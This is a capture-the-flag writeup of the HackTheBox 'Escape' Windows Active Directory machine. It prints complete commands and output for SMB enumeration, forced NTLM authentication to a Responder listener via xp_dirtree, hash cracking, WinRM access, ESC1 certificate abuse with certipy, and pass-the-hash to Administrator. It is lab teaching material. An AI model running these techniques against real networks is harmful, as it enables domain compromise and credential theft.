---
title: "HackTheBox - Escape"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox"
date: 2025-11-10 12:11:20 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, mssql, ntlm relay, responder, adcs, esc1, certificate abuse, password cracking, winrm, sql]
img_path: /assets/img/HackTheBox/Machines/Escape
image:
    path: /assets/img/HackTheBox/Machines/Escape/escape.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

[Escape](https://www.hackthebox.com/machines/escape) from [HackTheBox](https://www.hackthebox.com/) is a medium Windows Active Directory machine that begins with anonymous SMB enumeration to extract a sensitive PDF file containing temporary MSSQL credentials. Using these credentials, we connect to the MSSQL service and leverage `xp_dirtree` to force NTLM authentication to our Responder listener, capturing the `sql_svc` account's NTLMv2 hash. After cracking the hash, we authenticate via WinRM and discover SQL Server error logs containing `Ryan.Cooper`'s password  due to a failed authentication attempt. Finally, we exploit a vulnerable ADCS certificate template (ESC1) that allows Enrollee Supplies Subject with the `UserAuthentication` template to request a certificate for the Administrator account, retrieve the Administrator's NTLM hash via Kerberos PKINIT authentication, and achieve full domain compromise via Pass-the-Hash.

## **Enumeration**

### nmap

```bash
Nmap scan report for 10.129.43.157
Host is up (0.40s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-10 20:12:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Sit
|_ssl-date: 2025-11-10T20:14:06+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Sit
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
9389/tcp  open  mc-nmf        .NET Message Framing
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2025-11-10T20:13:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 571.20 seconds
```

let’s start by checking if Guest or anonymous login is enabled 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc smb sequel.htb -u 'a' -p ''
SMB         10.129.43.157   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.43.157   445    DC               [+] sequel.htb\a: (Guest)
                                                                                                                    
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc smb sequel.htb -u 'a' -p '' --shares
SMB         10.129.43.157   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.43.157   445    DC               [+] sequel.htb\a: (Guest)
SMB         10.129.43.157   445    DC               [*] Enumerated shares
SMB         10.129.43.157   445    DC               Share           Permissions     Remark
SMB         10.129.43.157   445    DC               -----           -----------     ------
SMB         10.129.43.157   445    DC               ADMIN$                          Remote Admin
SMB         10.129.43.157   445    DC               C$                              Default share
SMB         10.129.43.157   445    DC               IPC$            READ            Remote IPC
SMB         10.129.43.157   445    DC               NETLOGON                        Logon server share 
SMB         10.129.43.157   445    DC               Public          READ            
SMB         10.129.43.157   445    DC               SYSVOL                          Logon server share 
```

Guest login is enabled and we can list the shares 

we have access to the Public share

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ smbclient  -U '' -N //10.129.43.157/Public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1440927 blocks available
smb: \> get SQL Server Procedures.pdf 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \SQL
smb: \> get "SQL Server Procedures.pdf" 
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (94.7 KiloBytes/sec) (average 94.7 KiloBytes/sec)
smb: \> exit
```

we found a PDF file talking about some MSSQL stuff

```bash
SQL Server Procedures

Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should

you even put a mock instance on the DC?!). So Tom decided it was a good idea to write a basic procedure on how to access and

then test any changes to the database. Of course none of this will be done on the live server, we cloned the DC mockup to a

dedicated server. 

Tom will remove the instance from the DC as soon as he comes back from his vacation. 

The second reason behind this document is to work like a guide when no senior can be available for all juniors.

Accessing from Domain Joined machine

1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:

https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16

2. In the "Server Name" field, input the server name.

3. Specify "Windows Authentication" and you should be good to go.

4. Access the database and make that you need. Everything will be resynced with the Live server overnight.

Accessing from non domain joined machine

Accessing from non domain joined machines can be a little harder. 
The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following
command:  cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> . Follow the other steps from
above procedure.

If any problem arises, please send a mail to Brandon 

Bonus

For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with

user  PublicUser  and password  GuestUserCantWrite1 . 

Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

the main idea here is there is a SQL server and we have got Guest Credentials `PublicUser:GuestUserCantWrite1`

let’s test the credentials

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc smb sequel.htb -u 'PublicUser' -p 'GuestUserCantWrite1' --users 
SMB         10.129.43.157   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                       
SMB         10.129.43.157   445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 (Guest)

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc mssql sequel.htb -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
MSSQL       10.129.43.157   1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.129.43.157   1433   DC               [+] DC\PublicUser:GuestUserCantWrite1 
```

now let’s authenticate to MSSQL and see what we can do

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.43.157              
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (PublicUser  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```

we can run commands because of permissions 

but we can use `xp_dirtree` 

so let’s use it to  force the SQL Server to authenticate to our attacking machine and capture NTLM hashes

```bash
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.100\share
subdirectory   depth   file   
------------   -----   ----  
```

and in responder 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ sudo responder -I tun0                    
[sudo] password for drli: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.100]
    Responder IPv6             [dead:beef:2::1062]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-D1883WUOMPB]
    Responder Domain Name      [R10E.LOCAL]
    Responder DCE-RPC Port     [48086]

[+] Listening for events...                                                                                               

[SMB] NTLMv2-SSP Client   : 10.129.43.157
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:22732864ef9cd4f4:50A7BB2A5E155E8EAC6E88FD195A81C7:010100000000000000F7F52E1352DC011DF9382E755B6E820000000002000800520031003000450001001E00570049004E002D0044003100380038003300570055004F004D005000420004003400570049004E002D0044003100380038003300570055004F004D00500042002E0052003100300045002E004C004F00430041004C000300140052003100300045002E004C004F00430041004C000500140052003100300045002E004C004F00430041004C000700080000F7F52E1352DC0106000400020000000800300030000000000000000000000000300000D16266008ABEA9040222CF281627FFCBDE92D604C47B506EC8948EBE2A2914830A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300030000000000000000000      
[+] Exiting...
```

let’s crack the hash

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ hashcat -m 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 3340/6744 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SQL_SVC::sequel:22732864ef9cd4f4:50a7bb2a5e155e8eac6e88fd195a81c7:010100000000000000f7f52e1352dc011df9382e755b6e820000000002000800520031003000450001001e00570049004e002d0044003100380038003300570055004f004d005000420004003400570049004e002d0044003100380038003300570055004f004d00500042002e0052003100300045002e004c004f00430041004c000300140052003100300045002e004c004f00430041004c000500140052003100300045002e004c004f00430041004c000700080000f7f52e1352dc0106000400020000000800300030000000000000000000000000300000d16266008abea9040222cf281627ffcbde92d604c47b506ec8948ebe2a2914830a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100300030000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:22732864ef9cd4f4:50a7bb2a5e155e8eac...000000
Time.Started.....: Mon Nov 10 07:27:59 2025 (18 secs)
Time.Estimated...: Mon Nov 10 07:28:17 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   540.3 kH/s (1.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10700800/14344385 (74.60%)
Rejected.........: 0/10700800 (0.00%)
Restore.Point....: 10699776/14344385 (74.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REJONTE -> REDOCEAN22
Hardware.Mon.#1..: Util: 52%

Started: Mon Nov 10 07:27:57 2025
Stopped: Mon Nov 10 07:28:18 2025
```

let’s test the credentials

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc mssql sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' 
MSSQL       10.129.43.157   1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.129.43.157   1433   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
                                                                                                              
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc ldap sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' 
LDAP        10.129.43.157   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAP        10.129.43.157   389    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
                                                                                            
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc winrm sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' 
WINRM       10.129.43.157   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.43.157   5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)                                                                                           
```

we have access to WINRM 

let’s connect

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ evil-winrm -i sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> cd C:\
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```

we have access to the SQLServer folder 

let’s see what’s inside

```bash
*Evil-WinRM* PS C:\> cd SQLServer
*Evil-WinRM* PS C:\SQLServer> ls

    Directory: C:\SQLServer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> ls

    Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK
                                        
Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
                                        
Info: Download successful!
```

inside the file we can find several logs and one of them has this 

```bash
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

`'NuclearMosquito3'` this could be rayns password

let’s test it

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ nxc winrm sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3' 
WINRM       10.129.43.157   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.43.157   5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
```

the credentials work we can authenticate to WINRM

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ evil-winrm -i sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> ls

    Directory: C:\Users\Ryan.Cooper\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/10/2025  11:49 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
7fc4adcfd8b862ba3e953c29735ce2de
```

### Privilege Escalation

let’s try ADCS and see if we can find anything 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ certipy find -vulnerable -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.43.157 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

BINGO!

we have a certificate that is vulnerable to ESC1

check this out to understand more about it: [https://www.hackingarticles.in/ad-certificate-exploitation-esc1/](https://www.hackingarticles.in/ad-certificate-exploitation-esc1/)

let’s execute the attack

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ certipy req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.43.157 -ca sequel-DC-CA -target 'dc.sequel.htb' -template 'UserAuthentication' -upn 'administrator@sequel.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

now we can get the NT hash from the PFX

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ sudo ntpdate sequel.htb; certipy auth -pfx administrator.pfx -dc-ip 10.129.43.157
2025-11-10 16:09:46.699242 (-0500) +28799.324389 +/- 0.031370 sequel.htb 10.129.43.157 s1 no-leap
CLOCK: time stepped by 28799.324389
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

now let’s connect 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Escape]
└─$ evil-winrm -i sequel.htb -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
701fc2a79b1a6f5e1e58f997aaca57d6
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

DONE!